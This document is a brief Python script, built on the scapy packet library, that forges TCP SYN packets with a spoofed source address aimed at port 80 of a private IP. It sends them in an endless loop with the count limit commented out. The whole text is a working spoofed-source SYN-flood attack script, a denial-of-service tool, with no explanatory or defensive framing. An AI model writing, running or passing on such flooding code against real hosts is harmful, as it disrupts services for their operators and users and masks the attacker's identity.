from scapy.all import *

# Define the target IP address
target_ip = "192.168.171.87"

# Define the spoofed source IP address
spoofed_ip = "10.0.0.1"

# Create an IP packet
ip_packet = IP(src=spoofed_ip, dst=target_ip)

# Create a TCP SYN packet (for example)
tcp_syn_packet = TCP(dport=80, flags="S")

# Combine the layers
packet = ip_packet / tcp_syn_packet

# Define the number of packets you want to send
#num_packets = 1000 # You can adjust the number of packets to send

# Send the packet in a loop
#for _ in range(num_packets):
while True:
    send(packet)
